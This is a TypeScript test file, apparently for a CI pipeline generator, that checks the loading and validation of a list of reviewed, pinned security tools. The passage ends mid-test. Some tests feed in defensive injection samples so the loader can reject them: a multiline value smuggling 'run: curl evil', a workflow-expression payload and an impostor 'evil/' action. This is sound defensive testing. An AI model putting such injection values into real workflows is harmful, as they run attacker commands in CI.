import { readFileSync } from 'node:fs';
import { join, resolve } from 'node:path';
import { afterEach, describe, expect, it, vi } from 'vitest';
import { parse, stringify } from 'yaml';
import { checkPinnedAgainstReviewed, loadPinnedBinaries } from '../src/engine/linters.js';
import { NEED_ID_CATEGORY } from '../src/engine/needs.js';
import { newRateBudget } from '../src/engine/github-rate.js';
import { COOLDOWN_DAYS, PinError, PLATFORM_ACTION_IDS, resolvePin } from '../src/engine/pin.js';
import {
  BETTERLEAKS_ALLOWED_FLAGS, effectiveProtectedPaths, loadReviewed, MUST_VERIFY, nearDuplicate, NUCLEI_ALLOWED_FLAGS, TRIVY_ALLOWED_FLAGS, NEVER_IMAGES, NEVER_NAME_ALLOW, NEVER_REPOS, neverImage, neverListed, packageExists, projectScriptFor,
  ReviewedListError, reviewedFor, TOOL_CATEGORIES,
} from '../src/engine/reviewed.js';
import { ACTION_POLICIES, ARGV_POLICIES, BETTERLEAKS_FORBIDDEN_FLAGS, BETTERLEAKS_FORBIDDEN_SUBCOMMANDS, type ArgvPolicy, type InputSpec } from '../src/engine/tool-flags.js';
import { BETTERLEAKS_GRAMMAR, NUCLEI_GRAMMAR, TRIVY_GRAMMAR, type FlagGrammar } from '../src/engine/tool-grammar.js';
import { NEED_CATEGORIES, PROTECTED_PATHS_BASE, type Language, type Need, type ReviewedTool, type Service } from '../src/types.js';
import { fakeFetch } from './helpers/fake-http.js';
import { cleanupRepos, makeTempDir, writeIn } from './helpers/make-repo.js';
import { emptyServiceQuality } from '../src/read/quality.js';

const root = resolve(import.meta.dirname, '..');
const DATA = resolve(root, 'data/reviewed-tools.yml');
const DAY = 86_400_000;

afterEach(() => {
  cleanupRepos();
  vi.unstubAllEnvs();
});

// ---------- builders (plain objects, as they appear in the YAML file) ----------

const SHA = 'a'.repeat(40);
const SUM = 'b'.repeat(64);
const DIGEST = `sha256:${'c'.repeat(64)}`;
const RULES_SHA = 'd'.repeat(40);
const RULES_URL = `https://github.com/semgrep/semgrep-rules/archive/${RULES_SHA}.tar.gz`;
// env names for the semgrep rules pack (ruling S22), built from parts like the field names elsewhere
const RULES_URL_ENV = ['PIPEGEN', 'RULES', 'URL'].join('_');
const RULES_SUM_ENV = ['PIPEGEN', 'RULES', 'SHA256'].join('_');
const RULES_TREE_ENV = ['PIPEGEN', 'RULES', 'TREE'].join('_');
const RULES_TREE = 'e'.repeat(40);
/** Where the renderer puts the verified rules; semgrep must be pointed at it explicitly (its default config is auto). */
const RULES_DIR = '/pipegen-rules';
const RULES_ENV = { [RULES_URL_ENV]: RULES_URL, [RULES_SUM_ENV]: SUM, [RULES_TREE_ENV]: RULES_TREE };
// the checkout input that keeps the job's GitHub credential out of .git/config, built from parts
const PERSIST = ['persist', 'credentials'].join('-');

type Entry = Record<string, any>;

function candidate(id: string, kind: 'action' | 'cli' | 'docker', repo: string, version: string, pin: object, categories: string[]): Entry {
  return { id, name: repo, kind, repo, version, pin, source: 'reviewed', reviewed: true, categories };
}

/** A reviewed action entry (pinned by SHA). */
function actionEntry(over: Entry = {}): Entry {
  const id = over.id ?? 'actions-setup-node';
  const repo = over.repo ?? 'actions/setup-node';
  const categories = over.categories ?? ['platform'];
  const sha = over.sha ?? SHA;
  return {
    id, categories, languages: ['node'], releasedAt: '2026-01-01T00:00:00Z',
    candidate: candidate(id, 'action', repo, 'v6.0.0', { sha }, categories),
    step: { action: { uses: `${repo}@${sha}`, with: { 'package-manager-cache': 'false' } }, output: { path: '', format: 'none' } },
    fixedInputs: { with: { 'package-manager-cache': 'false' } },
    choices: { 'node-version': ['24', '26'] },
    configFiles: [],
    reviewedBy: 'PENDING', reviewedAt: 'PENDING', proofs: 0,
  };
}

/** gitleaks' locked flags (ruling P21), in the command and the fixed args. */
const GITLEAKS_ARGS = ['--ignore-gitleaks-allow', '--redact', '--report-format', 'sarif', '--report-path', 'gitleaks.sarif', '--exit-code', '1'];

/**
 * Argv allowlists for the fixture-only ids (ruling P19 refuses a cli entry without one): the real table, plus the
 * generic fixture tool `tool` (binEntry), the package fixture `linter` (pkgEntry) and a second gitleaks id.
 */
const FIXTURE_POLICIES: Record<string, ArgvPolicy> = {
  ...ARGV_POLICIES,
  'gitleaks-proven': ARGV_POLICIES.gitleaks as ArgvPolicy,
  tool: { method: 'github-release', package: 'tool_1.0.0_linux_amd64.tar.gz', exe: 'tool', dialect: 'long', sub: [], flags: { format: { values: ['sarif'] }, output: 'output' }, config: { flag: '--config', content: 'x: 1\n' } },
  linter: { method: 'npm', package: 'eslint', exe: 'linter', dialect: 'long', sub: [], flags: { format: { values: ['sarif'] } } },
  'linter-pip': { method: 'pip', package: 'schemathesis', exe: 'linter', dialect: 'long', sub: [], flags: { format: { values: ['sarif'] } } },
};

/** A reviewed release-binary entry (pinned by sha256). */
function cliEntry(over: Entry = {}): Entry {
  const id = over.id ?? 'gitleaks';
  const repo = over.repo ?? 'gitleaks/gitleaks';
  const categories = over.categories ?? ['secrets'];
  return {
    id, categories, languages: ['any'], releasedAt: '2026-01-01T00:00:00Z',
    candidate: candidate(id, 'cli', repo, 'v8.30.1', { checksum: SUM }, categories),
    step: {
      cli: { install: { method: 'github-release', package: 'gitleaks_8.30.1_linux_x64.tar.gz', version: 'v8.30.1' }, command: ['gitleaks', 'git', ...GITLEAKS_ARGS, '.'] },
      output: { path: 'gitleaks.sarif', format: 'sarif' },
    },
    fixedInputs: { args: [...GITLEAKS_ARGS], config: { content: '[extend]\nuseDefault = true\n', passAs: { flag: '--config' } } },
    choices: {},
    configFiles: ['.gitleaks.toml', '.gitleaksignore'],
    reviewedBy: 'PENDING', reviewedAt: 'PENDING', proofs: 0,
  };
}

/** The Semgrep CE entry: an image, with a rules pack pinned by commit SHA and archive sha256 (ruling S22). */
function semgrepEntry(env: Record<string, string> = RULES_ENV, command?: string[], args = ['--metrics=off', '--disable-version-check', '--config', RULES_DIR]): Entry {
  const categories = ['sast'];
  return {
    id: 'semgrep', categories, languages: ['node', 'python'], releasedAt: '2026-01-01T00:00:00Z',
    candidate: candidate('semgrep', 'docker', 'semgrep/semgrep', '1.181.0', { digest: DIGEST }, categories),
    step: {
      cli: { install: { method: 'docker', package: 'semgrep/semgrep', version: '1.181.0' }, command: command ?? ['semgrep', 'scan', '--metrics=off', '--disable-version-check', '--config', RULES_DIR, '--sarif', '--output', 'semgrep.sarif'], env },
      output: { path: 'semgrep.sarif', format: 'sarif' },
    },
    fixedInputs: { args, env },
    choices: { rules: ['javascript', 'python'] },
    configFiles: ['.semgrepignore'],
    reviewedBy: 'PENDING', reviewedAt: 'PENDING', proofs: 0,
  };
}

function writeList(tools: Entry[]): string {
  const dir = makeTempDir();
  writeIn(dir, 'reviewed-tools.yml', stringify({ pinnedOn: '2026-10-26T00:00:00Z', tools }));
  return `${dir}/reviewed-tools.yml`;
}

const load = (tools: Entry[]) => loadReviewed(writeList(tools), { argvPolicies: FIXTURE_POLICIES });
const rejects = (tools: Entry[], why?: RegExp) => expect(() => load(tools)).toThrow(why ?? ReviewedListError);

const need = (id: string, over: Partial<Need> = {}): Need => ({
  id, layer: 'push', category: (NEED_ID_CATEGORY as Record<string, string>)[id] ?? id, why: 'x', blocking: true, floor: false, ...over,
});
const svc = (over: Partial<Service> = {}): Service => ({
  name: 'web', path: 'apps/web', language: 'node', hasTests: true, envVars: [], dependsOn: [], scripts: ['test', 'lint'], frameworks: [], quality: emptyServiceQuality(), ...over,
});

/** The real list, read raw (for releasedAt and pinnedOn, which loadReviewed doesn't return). */
const rawFile = () => parse(readFileSync(DATA, 'utf8')) as { pinnedOn: string; tools: Entry[] };
const real = () => loadReviewed();
const byId = (list: ReviewedTool[], id: string) => list.filter((t) => t.id === id);

// ---------- loading and validation ----------

describe('loadReviewed', () => {
  it('reviewed: loads and validates; unpinned entry rejected', () => {
    const list = load([actionEntry(), cliEntry(), semgrepEntry()]);
    expect(list.map((t) => t.id)).toEqual(['actions-setup-node', 'gitleaks', 'semgrep']);
    for (const t of list) {
      expect(t.candidate.reviewed).toBe(true);
      expect(t.candidate.source).toBe('reviewed');
      expect('releasedAt' in t).toBe(false); // file metadata, not part of ReviewedTool
    }
    // the real list loads too (in this dev build, PENDING entries are allowed)
    expect(real().length).toBeGreaterThan(20);

    // unpinned: no pin at all, a short SHA, a missing checksum, a digest that isn't sha256
    const a = actionEntry();
    a.candidate.pin = {};
    rejects([a]);
    rejects([actionEntry({ sha: 'abc1234' })]);
    const c = cliEntry();
    c.candidate.pin = {};
    rejects([c]);
    const d = semgrepEntry();
    d.candidate.pin = { digest: 'latest' };
    rejects([d]);
    // the wrong kind of pin for the kind of tool
    const wrong = actionEntry();
    wrong.candidate.pin = { checksum: SUM };
    rejects([wrong]);
    // reviewed: false, or not from the reviewed source
    const unreviewed = cliEntry();
    unreviewed.candidate.reviewed = false;
    rejects([unreviewed]);
    const discovered = cliEntry();
    discovered.candidate.source = 'discovery';
    rejects([discovered]);
  });

  it('reviewed: entry without configFiles or fixedInputs rejected', () => {
    const noConfig = cliEntry();
    delete noConfig.configFiles;
    rejects([noConfig]);
    const noFixed = cliEntry();
    delete noFixed.fixedInputs;
    rejects([noFixed]);
    // present but empty is fine: creosote takes no fixed input and loads no config file pipegen lists
    const empty = cliEntry({ id: 'creosote', repo: 'fredrikaverpil/creosote', categories: ['dead-code'] });
    empty.step.cli.command = ['creosote'];
    empty.candidate.version = '5.2.0';
    empty.step.cli.install = { method: 'pip', package: 'creosote', version: '5.2.0' };
    empty.configFiles = [];
    empty.fixedInputs = {};
    empty.step.output = { path: '', format: 'none' };
    expect(load([empty])[0]?.configFiles).toEqual([]);
    // a config file path that leaves the repo is refused
    const escape = cliEntry();
    escape.configFiles = ['../outside.toml'];
    rejects([escape]);
  });

  it('reviewed: PENDING refused in production mode', () => {
    const path = writeList([actionEntry(), cliEntry()]);
    expect(loadReviewed(path)).toHaveLength(2); // dev/test: allowed, so the list can be built and reviewed
    vi.stubEnv('NODE_ENV', 'production');
    expect(() => loadReviewed(path)).toThrow(/review/i);
    vi.unstubAllEnvs();
    vi.stubEnv('PIPEGEN_RELEASE', '1'); // what the bundled dist build defines (ruling S21)
    expect(() => loadReviewed(path)).toThrow(/review/i);
    // reviewed entries load in a release build
    const done = [actionEntry(), cliEntry()].map((e) => ({ ...e, reviewedBy: 'Cristiano Pereira', reviewedAt: '2026-11-01' }));
    expect(loadReviewed(writeList(done))).toHaveLength(2);
    // reviewedBy and reviewedAt go together
    vi.unstubAllEnvs();
    rejects([{ ...actionEntry(), reviewedBy: 'Cristiano Pereira', reviewedAt: 'PENDING' }]);
    rejects([{ ...actionEntry(), reviewedBy: 'PENDING', reviewedAt: '2026-11-01' }]);
  });

  it('reviewed (Task 5, M7): the PENDING refusal carries a short reason for the audit warning; the message is unchanged', () => {
    const path = writeList([actionEntry(), cliEntry()]);
    vi.stubEnv('PIPEGEN_RELEASE', '1');
    let e: unknown;
    try {
      loadReviewed(path);
    } catch (caught) {
      e = caught;
    } finally {
      vi.unstubAllEnvs();
    }
    expect(e).toBeInstanceOf(ReviewedListError);
    const err = e as ReviewedListError;
    expect(err.reason).toMatch(/^2 entries still wait for human review \(.+\)$/);
    expect(err.message).toBe(`This pipegen release refuses its reviewed tool list: ${err.reason}. Nothing unreviewed may run in your CI.`);
    // the other refusals keep their message and have a reason too
    expect(() => loadReviewed(join(makeTempDir(), 'missing.yml'))).toThrow(expect.objectContaining({ reason: 'it could not be read' }));
  });

  it('reviewed: semgrep entry with a registry rule pack (p/…) or auto rejected; sha-pinned pack accepted', () => {
    expect(load([semgrepEntry()])[0]?.fixedInputs.env?.[RULES_URL_ENV]).toBe(RULES_URL);
    // registry names and auto, anywhere in the command (the fixed args stay, so only the pack is wrong)
    const scan = (...rest: string[]) => ['semgrep', 'scan', '--metrics=off', '--disable-version-check', '--config', RULES_DIR, ...rest];
    const REGISTRY = /registry rule packs/;
    rejects([semgrepEntry(undefined, scan('--config', 'p/default'))], REGISTRY);
    rejects([semgrepEntry(undefined, scan('--config', 'auto'))], REGISTRY);
    rejects([semgrepEntry(undefined, scan('--config=auto'))], REGISTRY);
    rejects([semgrepEntry(undefined, scan('--config=r/python.lang'))], REGISTRY);
    // glued short options are configs too (N3)
    rejects([semgrepEntry(undefined, scan('-fauto'))], REGISTRY);
    rejects([semgrepEntry(undefined, scan('-cp/default'))], REGISTRY);
    rejects([semgrepEntry(undefined, scan('-f=auto'))], REGISTRY);
    rejects([semgrepEntry(undefined, scan('-c/tmp/x'))], /--config/);
    rejects([semgrepEntry(undefined, scan('-f=/tmp/x'))], /--config/);
    // semgrep's default config is auto: a command with no --config at the verified rules dir is refused (I2)
    const noConfig = ['semgrep', 'scan', '--metrics=off', '--sarif'];
    rejects([semgrepEntry(undefined, noConfig, ['--metrics=off'])], /--config/);
    rejects([semgrepEntry(undefined, ['semgrep', 'scan', '--metrics=off', '--config', '/tmp/rules'], ['--metrics=off'])], /--config/);
    rejects([semgrepEntry(undefined, scan('--config', 'rules.yml'))], /--config/); // a second config next to the verified one
    rejects([semgrepEntry(undefined, undefined, ['--metrics=off'])], /--config/); // the --config must be a fixed arg too
    // a rules URL that isn't pinned to a 40-character commit, no archive hash, or no tree SHA
    rejects([semgrepEntry({ ...RULES_ENV, [RULES_URL_ENV]: 'https://github.com/semgrep/semgrep-rules/archive/refs/heads/develop.tar.gz' })], /40-character commit/);
    rejects([semgrepEntry({ ...RULES_ENV, [RULES_URL_ENV]: 'https://semgrep.dev/c/p/default' })], /40-character commit/);
    rejects([semgrepEntry({ [RULES_URL_ENV]: RULES_URL, [RULES_TREE_ENV]: RULES_TREE })], /sha256/);
    rejects([semgrepEntry({ ...RULES_ENV, [RULES_SUM_ENV]: 'abc' })], /sha256/);
    rejects([semgrepEntry({ [RULES_URL_ENV]: RULES_URL, [RULES_SUM_ENV]: SUM })], /tree/);
    // the explicit config at the verified rules dir is accepted, in both spellings
    expect(load([semgrepEntry(undefined, scan('--sarif'))])).toHaveLength(1);
    expect(load([semgrepEntry(undefined, ['semgrep', 'scan', '--metrics=off', '--disable-version-check', `--config=${RULES_DIR}`], ['--metrics=off', '--disable-version-check', `--config=${RULES_DIR}`])])).toHaveLength(1);
    // the real entry: explicit --config at the verified dir, and the commit's tree SHA recorded
    const real = byId(loadReviewed(), 'semgrep')[0];
    expect(real?.step.cli?.command.join(' ')).toContain(`--config ${RULES_DIR}`);
    expect(real?.fixedInputs.env?.[RULES_TREE_ENV]).toBe('dd3179667faf14717e05c33b1916b0d2c349673d');
  });

  it('reviewed: an image name is checked with the same grammar pinning uses (one image grammar, final review M2)', async () => {
    const withImage = (pkg: string) => {
      const e = semgrepEntry();
      e.step.cli.install.package = pkg;
      return e;
    };
    // what resolvePin says about the name: refused before any request, or accepted (then it asks the registry)
    const pinAccepts = async (pkg: string) => {
      const deps = { gh: {} as never, fetch: fakeFetch({}).fetch, alert: () => {}, notes: [], budget: newRateBudget() };
      const c = { id: 'x', name: 'x', kind: 'docker' as const, repo: 'o/r', version: '1.0', pin: {}, source: 'discovery' as const, reviewed: false, categories: [] };
      const err = await resolvePin(c, deps, { method: 'docker', package: pkg, version: '1.0' }).catch((e: unknown) => e);
      return !(err instanceof PinError && /isn't an image name/.test(err.message));
    };
    const cases: [string, boolean][] = [
      ['semgrep/semgrep', true], ['docker.io/semgrep/semgrep', true], ['index.docker.io/semgrep/semgrep', true],
      ['registry-1.docker.io/semgrep/semgrep', true], ['registry', true], ['ghcr.io/zaproxy/zaproxy', true], ['ghcr.io/a/b/c', true],
      ['quay.io/x/y', false], ['localhost/x', false], ['docker.io/a/b/c', false], ['index.docker.io/a/b/c', false],
      ['example.com:5000/x/y', false], ['Semgrep/semgrep', false], ['semgrep/semgrep:1.0', false],
    ];
    for (const [pkg, ok] of cases) {
      expect(await pinAccepts(pkg), `pin: ${pkg}`).toBe(ok);
      // the image grammar is what's tested here, so semgrep's allowlist follows the name under test (P28 binds it)
      const loadAs = (e: Entry) => loadReviewed(writeList([e]), { argvPolicies: { ...FIXTURE_POLICIES, semgrep: { ...(ARGV_POLICIES.semgrep as ArgvPolicy), package: pkg } } });
      if (ok) expect(loadAs(withImage(pkg)), `reviewed: ${pkg}`).toHaveLength(1);
      else expect(() => loadAs(withImage(pkg)), `reviewed: ${pkg}`).toThrow(/image name/);
    }
    // the image tag follows the same grammar too ('+' is no image tag character)
    const plus = semgrepEntry();
    plus.candidate.version = '1.181.0+build';
    plus.step.cli.install.version = '1.181.0+build';
    expect(() => load([plus])).toThrow(/image tag/);
  });

  it('TOOL_CATEGORIES: NEED_CATEGORIES plus platform only', () => {
    expect([...TOOL_CATEGORIES]).toEqual([...NEED_CATEGORIES, 'platform']);
    expect(NEED_CATEGORIES).toEqual(expect.arrayContaining(['egress', 'workflow-lint']));
    rejects([actionEntry({ categories: ['cache'] })]);
    rejects([actionEntry({ categories: [] })]);
    const mismatch = actionEntry();
    mismatch.candidate.categories = ['sast'];
    rejects([mismatch]);
    for (const t of real()) for (const c of t.categories) expect(TOOL_CATEGORIES, `${t.id}: ${c}`).toContain(c);
  });

  it('reviewed: the step runs exactly the pinned tool; an install hash must equal the candidate pin', () => {
    const moved = actionEntry();
    moved.step.action.uses = `actions/setup-node@${'e'.repeat(40)}`;
    rejects([moved]);
    const tagged = actionEntry();
    tagged.step.action.uses = 'actions/setup-node@v6';
    rejects([tagged]);
    const other = actionEntry();
    other.step.action.uses = `evil/setup-node@${SHA}`;
    rejects([other]);
    // a sub-action of the same repo is fine (github/codeql-action/upload-sarif)
    const sub = actionEntry({ id: 'codeql-upload-sarif', repo: 'github/codeql-action' });
    sub.step.action.uses = `github/codeql-action/upload-sarif@${SHA}`;
    sub.fixedInputs = {};
    sub.step.action.with = {};
    sub.choices = {};
    expect(load([sub])).toHaveLength(1);
    // install hash: absent (the candidate pin is the one source) or equal to the pin
    const same = cliEntry();
    same.step.cli.install.checksum = SUM;
    expect(load([same])).toHaveLength(1);
    const differs = cliEntry();
    differs.step.cli.install.checksum = 'f'.repeat(64);
    rejects([differs]);
    const version = cliEntry();
    version.step.cli.install.version = 'v8.30.0';
    rejects([version]);
  });

  it('reviewed: choices are enums and never cover a fixed input; no workflow expressions', () => {
    const overlap = actionEntry();
    overlap.choices = { 'package-manager-cache': ['true', 'false'] };
    rejects([overlap]);
    const emptyChoice = actionEntry();
    emptyChoice.choices = { 'node-version': [] };
    rejects([emptyChoice]);
    const notInStep = actionEntry();
    notInStep.step.action.with = {};
    rejects([notInStep]); // a fixed input the step template doesn't set
    const expr = actionEntry();
    expr.choices = { 'node-version': ['${{ github.event.issue.title }}'] };
    rejects([expr], /\$\{\{/);
    const multiline = actionEntry();
    multiline.step.action.with['package-manager-cache'] = 'false\nrun: curl evil';
    multiline.fixedInputs.with['package-manager-cache'] = 'false\nrun: curl evil';
    rejects([multiline], /line breaks/);
    const dup = [actionEntry(), actionEntry()];
    rejects(dup, /more than once|duplicate/i);
  });

  it('reviewed: a choice may not share a name with a fixed flag or a config input (M2)', () => {
    const flag = cliEntry();
    flag.choices = { 'report-format': ['sarif', 'json'] }; // --report-format is a fixed arg
    rejects([flag], /fixed/);
    const configFlag = cliEntry();
    configFlag.choices = { config: ['a', 'b'] }; // the pinned config goes in through --config
    rejects([configFlag], /fixed/);
    const input = actionEntry();
    input.fixedInputs.config = { content: 'x: 1\n', passAs: { input: 'config-file' } };
    input.choices = { 'config-file': ['a.yml'] };
    rejects([input], /fixed/);
    const ok = trivyEntry({ choices: { severity: ['CRITICAL', 'HIGH,CRITICAL'] } });
    expect(load([ok])).toHaveLength(1);
  });

  it('reviewed: reviewedBy is PENDING exactly or a real name; reviewedAt a real date on or after pinnedOn (M3)', () => {
    const at = (reviewedBy: string, reviewedAt: string) => ({ ...actionEntry(), reviewedBy, reviewedAt });
    for (const variant of ['pending', 'Pending', 'PENDING ', ' PENDING']) rejects([at(variant, '2026-11-01')], /PENDING/);
    for (const blank of ['', '   ']) rejects([at(blank, '2026-11-01')]);
    // a printable name only: no zero-width or control characters (M3+)
    rejects([at('PENDING\u200b', '2026-11-01')], /printable name/);
    rejects([at('Cristiano\u200dPereira', '2026-11-01')], /printable name/);
    rejects([at('C', '2026-11-01')], /printable name/);
    expect(load([at("Cristiano O'Brien-Pereira", '2026-11-01')])).toHaveLength(1);
    rejects([at('Cristiano Pereira', '2026-02-30')], /real date/); // no such day
    rejects([at('Cristiano Pereira', '2026-10-25')], /pinnedOn/); // the fixture list is pinned on 2026-10-26
    expect(load([at('Cristiano Pereira', '2026-10-26')])).toHaveLength(1);
  });
});

// ---------- Plan P Task 5: the never-list, plugins, verifiedWith and the catalogue's tool locks ----------

const ISSUER = 'https://token.actions.githubusercontent.com';
/** A recorded signature check (PS24), bound to the entry: its own repo's workflow at its version tag. */
const verified = (repo: string, over: Entry = {}, version = 'v1.0.0'): Entry => ({
  method: 'cosign-bundle', asset: 'checksums.txt', identity: `https://github.com/${repo}/.github/workflows/release.yml@refs/tags/${version}`,
  issuer: ISSUER, verifiedOn: '2026-10-27', ...over,
});
const SRI = `sha512-${'A'.repeat(86)}==`;
const TRIVY_FLAGS = ['--disable-telemetry', '--skip-version-check', '--skip-check-update'];
const TRIVY_IDENTITY = 'https://github.com/aquasecurity/trivy/.github/workflows/reusable-release.yaml@refs/tags/v0.76.0';
// env names for the nuclei templates archive, built from parts like the semgrep ones
const NUCLEI_URL_ENV = ['PIPEGEN', 'NUCLEI', 'TEMPLATES', 'URL'].join('_');
const NUCLEI_SUM_ENV = ['PIPEGEN', 'NUCLEI', 'TEMPLATES', 'SHA256'].join('_');
const NUCLEI_DIR = '/pipegen-nuclei-templates';
const NUCLEI_URL = 'https://github.com/projectdiscovery/nuclei-templates/archive/refs/tags/v10.5.0.tar.gz';
const NUCLEI_ENV = { [NUCLEI_URL_ENV]: NUCLEI_URL, [NUCLEI_SUM_ENV]: SUM };

type BinOver = { id?: string; command?: string[]; args?: string[]; env?: Record<string, string>; config?: Entry | null; verifiedWith?: Entry | null; choices?: Entry };
/** A release-binary entry for any repo, valid unless the test breaks it (cliEntry with the parts the test names). */
function binEntry(repo: string, over: BinOver = {}): Entry {
  const e = cliEntry({ id: over.id ?? 'tool', repo });
  e.candidate.version = 'v1.0.0';
  // a reviewed id installs the package its allowlist names (P28); the generic fixture tool its own asset
  const reviewed = Object.hasOwn(ARGV_POLICIES, e.id) ? ARGV_POLICIES[e.id] : undefined;
  e.step.cli.install = { method: 'github-release', package: reviewed?.method === 'github-release' ? reviewed.package : 'tool_1.0.0_linux_amd64.tar.gz', version: 'v1.0.0' };
  e.step.cli.command = over.command ?? ['tool', '--format', 'sarif', '--output', 'tool.sarif'];
  e.step.output = { path: 'tool.sarif', format: 'sarif' };
  e.fixedInputs = { args: over.args ?? ['--format', 'sarif'] };
  if (over.env !== undefined) {
    e.step.cli.env = { ...over.env };
    e.fixedInputs.env = { ...over.env };
  }
  if (over.config !== null) e.fixedInputs.config = over.config ?? { content: 'x: 1\n', passAs: { flag: '--config' } };
  if (over.verifiedWith !== null && over.verifiedWith !== undefined) e.verifiedWith = over.verifiedWith;
  e.choices = over.choices ?? {};
  e.configFiles = [];
  return e;
}
/** An image entry (kind docker) for any image name. */
function imageEntry(image: string, repo = 'example/scanner'): Entry {
  const e = semgrepEntry();
  e.id = 'scanner';
  e.candidate = candidate('scanner', 'docker', repo, '1.0.0', { digest: DIGEST }, ['sast']);
  e.step.cli = { install: { method: 'docker', package: image, version: '1.0.0' }, command: ['scan', '--sarif'] };
  e.fixedInputs = { args: ['--sarif'] };
  e.choices = {};
  e.configFiles = [];
  return e;
}
/** An npm (or pip) entry with plugins. */
function pkgEntry(method: 'npm' | 'pip', plugins: Entry[] | undefined, pkg = method === 'npm' ? 'eslint' : 'schemathesis'): Entry {
  const version = method === 'npm' ? '10.13.0' : '4.32.2';
  const e = cliEntry({ id: method === 'npm' ? 'linter' : 'linter-pip', repo: method === 'npm' ? 'eslint/eslint' : 'schemathesis/schemathesis', categories: ['lint'] });
  e.candidate.version = version;
  e.candidate.pin = { checksum: method === 'npm' ? SRI : SUM };
  e.step.cli.install = { method, package: pkg, version };
  e.step.cli.command = ['linter', '--format', 'sarif'];
  e.fixedInputs = { args: ['--format', 'sarif'] };
  e.configFiles = [];
  if (plugins !== undefined) e.step.cli.plugins = plugins;
  return e;
}
const npmPlugin = (pkg: string, over: Entry = {}): Entry => ({ method: 'npm', package: pkg, version: '8.72.0', checksum: SRI, ...over });
const pipPlugin = (pkg: string, over: Entry = {}): Entry => ({ method: 'pip', package: pkg, version: '1.2.3', checksum: SUM, ...over });

/** The trivy fixture: the three hardening flags in the command and the fixed args, and the signature check. */
function trivyEntry(over: { command?: string[]; args?: string[]; verifiedWith?: Entry | null; repo?: string; choices?: Entry } = {}): Entry {
  const repo = over.repo ?? 'aquasecurity/trivy';
  return binEntry(repo, {
    id: 'trivy-config',
    command: over.command ?? ['trivy', 'config', ...TRIVY_FLAGS, '--format', 'sarif', '--output', 'tool.sarif', '--exit-code', '1', '.'],
    args: over.args ?? [...TRIVY_FLAGS, '--format', 'sarif', '--exit-code', '1'],
    config: { content: 'cache:\n  backend: memory\n', passAs: { flag: '--config' } },
    verifiedWith: over.verifiedWith === undefined ? verified(repo) : over.verifiedWith,
    ...(over.choices === undefined ? {} : { choices: over.choices }),
  });
}
const JSCPD_ARGS = ['--baseline-from-ref', 'origin/main', '--fail-on-new-clones'];
const jscpdEntry = (over: BinOver = {}) => {
  const e = binEntry('kucherenko/jscpd', {
    id: 'jscpd', command: ['jscpd', ...JSCPD_ARGS, '--reporters', 'sarif', '--output', 'jscpd-report', '.'], args: JSCPD_ARGS,
    config: { content: '{}\n', passAs: { flag: '--config' } }, verifiedWith: verified('kucherenko/jscpd'), ...over,
  });
  e.step.output = { path: '', format: 'none' };
  return e;
};
const blCmd = (...rest: string[]) => ['betterleaks', 'git', '--redact', '--report-format', 'sarif', '--report-path', 'tool.sarif', '--exit-code', '1', ...rest];
/** betterleaks' fixed args (P18, P21): --redact, the report format, --exit-code 1. */
const BL_ARGS = ['--redact', '--report-format', 'sarif', '--exit-code', '1'];
const betterleaksEntry = (over: BinOver = {}) => binEntry('betterleaks/betterleaks', {
  id: 'betterleaks', command: blCmd(), args: BL_ARGS,
  config: { content: '[extend]\nuseDefault = true\n', passAs: { flag: '--config' } }, verifiedWith: verified('betterleaks/betterleaks'), ...over,
});
const nucleiCmd = (...rest: string[]) => ['nuclei', '-duc', '-t', NUCLEI_DIR, '-severity', 'medium,high,critical', '-sarif-export', 'tool.sarif', ...rest];
const nucleiEntry = (over: BinOver = {}) => binEntry('projectdiscovery/nuclei', {
  id: 'nuclei', command: nucleiCmd(), args: ['-duc', '-t', NUCLEI_DIR], env: NUCLEI_ENV, config: null, ...over,
});

/**
 * The never-list as catalogue §4 names it (brief), plus the old names GitHub still redirects to them (checked with
 * `gh api repos/<old>` on 2026-10-27) and the same projects' own action repos. Each one is refused.
 */
const NEVER = [
  'checkmarx/kics-github-action', 'checkmarx/kics', 'checkmarx/kics-action',
  'aquasecurity/trivy-action', 'aquasecurity/setup-trivy',
  'gitleaks/gitleaks-action', 'zricethezav/gitleaks-action',
  'reviewdog/*',
  'slsa-framework/slsa-github-generator',
  'tenable/terrascan', 'accurics/terrascan', 'tenable/terrascan-action', 'accurics/terrascan-action',
  'aquasecurity/tfsec', 'tfsec/tfsec', 'liamg/tfsec', 'aquasecurity/tfsec-action', 'aquasecurity/tfsec-sarif-action', 'aquasecurity/tfsec-pr-commenter-action',
  'tfsec/tfsec-sarif-action', 'tfsec/tfsec-pr-commenter-action',
  'zizmorcore/zizmor-action',
  'portswigger/dastardly-github-action', 'portswigger/dastardly',
];
const NEVER_MSG = /never adds/;

describe('loader rules (Plan P Task 5)', () => {
  it('reviewed: never-list repos refused (kics, trivy-action, setup-trivy, gitleaks-action, reviewdog/*, dastardly, slsa-github-generator, terrascan, tfsec, zizmor-action)', () => {
    for (const key of NEVER) expect(NEVER_REPOS, key).toHaveProperty([key]);
    for (const [key, reason] of Object.entries(NEVER_REPOS)) {
      expect(key, key).toBe(key.toLowerCase());
      expect(reason.length, key).toBeGreaterThan(10);
    }
    expect(neverListed('aquasecurity/trivy')).toBeNull();
    expect(neverListed('gitleaks/gitleaks')).toBeNull();
    expect(neverListed('zizmorcore/zizmor')).toBeNull();
    expect(neverListed('reviewdog')).not.toBeNull(); // the owner alone
  });

  it.each(NEVER)('reviewed: never-list %s refused as candidate.repo, in uses: (any case, any sub-path), as an image and in a download URL', (key) => {
    const repo = key.replace('/*', '/action-setup');
    const upper = repo.toUpperCase();
    const mixed = repo.split('/').map((p) => p.charAt(0).toUpperCase() + p.slice(1)).join('/');
    // as the reviewed repo of an action, in any letter case
    for (const r of [repo, upper, mixed]) rejects([actionEntry({ id: 'x', repo: r })], NEVER_MSG);
    // in uses:, with a sub-path, even when candidate.repo names another repo
    for (const uses of [`${repo}/sub@${SHA}`, `${mixed}/a/b@${SHA}`, `${upper}@${SHA}`]) {
      const a = actionEntry({ id: 'x', repo: 'fine/tool' });
      a.step.action.uses = uses;
      rejects([a], NEVER_MSG);
    }
    // as a cli entry's repo (its release download URL is github.com/<repo>/releases/…)
    rejects([binEntry(repo)], NEVER_MSG);
    rejects([binEntry(mixed)], NEVER_MSG);
    // the same name under any other owner: a fork or a copy (fix round 1)
    if (!key.endsWith('/*')) rejects([actionEntry({ id: 'x', repo: `someone-else/${repo.split('/')[1]}` })], NEVER_MSG);
    // as an image, on any registry host
    const image = repo.toLowerCase();
    for (const pkg of [image, `docker.io/${image}`, `ghcr.io/${image}`, `ghcr.io/${image}/sub`]) rejects([imageEntry(pkg)], NEVER_MSG);
